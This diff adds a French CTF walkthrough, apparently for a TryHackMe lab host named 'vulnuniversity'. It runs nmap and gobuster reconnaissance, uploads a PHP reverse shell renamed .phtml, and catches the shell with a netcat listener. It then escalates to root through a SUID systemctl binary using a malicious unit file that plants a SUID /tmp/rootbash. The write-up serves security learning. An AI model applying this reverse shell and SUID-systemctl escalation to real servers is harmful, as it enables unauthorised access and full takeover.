@@ -1,0 +1,129 @@
+Pour la partie reconnaissance, le scan avec nmap montre ceci :
+---------------------------------------
+└─# nmap -sV -O 10.10.88.187
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-23 20:13 EDT
+Nmap scan report for 10.10.88.187
+Host is up (0.17s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 3.0.3
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3128/tcp open  http-proxy  Squid http proxy 3.5.12
+3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+Device type: general purpose
+Running: Linux 4.X
+OS CPE: cpe:/o:linux:linux_kernel:4.4
+OS details: Linux 4.4
+Network Distance: 2 hops
+Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.92 seconds
+---------------------------------------------------------------------
+
+La partie : Locating directories using Gobuster :
+------------------------------------------------
+└─# gobuster dir -u http://10.10.88.187:3333/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.88.187:3333/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/images               (Status: 301) [Size: 320] [--> http://10.10.88.187:3333/images/]
+/css                  (Status: 301) [Size: 317] [--> http://10.10.88.187:3333/css/]
+/js                   (Status: 301) [Size: 316] [--> http://10.10.88.187:3333/js/]
+/fonts                (Status: 301) [Size: 319] [--> http://10.10.88.187:3333/fonts/]
+/internal             (Status: 301) [Size: 322] [--> http://10.10.88.187:3333/internal/]
+
+---------------------------------------------------------------------------------------------------------
+
+La partie : Compromise the Webserver
+
+Il est question ici de compromettre le serveur grace a un script .phtml (telechargeable ici -----> https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
+Le script est en phph, il suffit de modifier la partie IP et Port pour pouvoir mettre sur ecoute via nc . Il faut aussi changer l'extension en .phtml. Apres avoir uploader votre script malveillant vous pouvez l'executer direct avec http://TARGET_IP:3333/internal/uploads/php-reverse-shell.phtml
+-----------------------------------------------------------------------------------------------------------------
+└─# nc -lnvp 1234           
+listening on [any] 1234 ...
+connect to [10.8.16.145] from (UNKNOWN) [10.10.88.187] 54512
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 20:23:46 up  2:00,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ cd /home 
+$ ls                        
+bill
+$ cd bill
+$ ls
+user.txt
+$ cat user.txt
+Le flag ce trouve a l'interieur du fichier user.txt. 
+Le proprio est donc bill
+----------------------------------------------------------------
+Pour le flag root :
+$find / -perm -4000 -type f 2>/dev/null
+Cette commande va trouver tout les repertoire et fichier sur laquelle l'utilisateur a des permissions. Celui qui nous interresse ici c'est le /bin/systemctl
+partie Priv Esc :
+---------------------
+Utilise ce  bout de code malveillant : 
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service
+
+/bin/systemctl link /tmp/root.service
+/bin/systemctl enable root.service
+/bin/systemctl start root.service
+apres execute ceci : /tmp/rootbash -p
+--------------------------------------------------------
+$ echo '[Unit]
+Description=Root escalation shell
+
+[Service]
+Type=oneshot
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
+RemainAfterExit=true
+
+[Install]
+WantedBy=multi-user.target' > /tmp/root.service
+$ /bin/systemctl link /tmp/root.service
+$ /bin/systemctl enable root.service
+Failed to execute operation: Too many levels of symbolic links
+$ /bin/systemctl start root.service
+$ /tmp/rootbash -p
+
+ls
+user.txt
+whoami
+root
+ls -l
+total 4
+-rw-r--r-- 1 bill bill 33 Jul 31  2019 user.txt
+cd /home
+ls
+bill
+pwd
+/home
+cd ..
+pwd
+/
+cd root
+ls
+root.txt
+cat root
+cat: root: No such file or directory
+cat root.txt
+
+Le flag root ce trouve dans root.txt
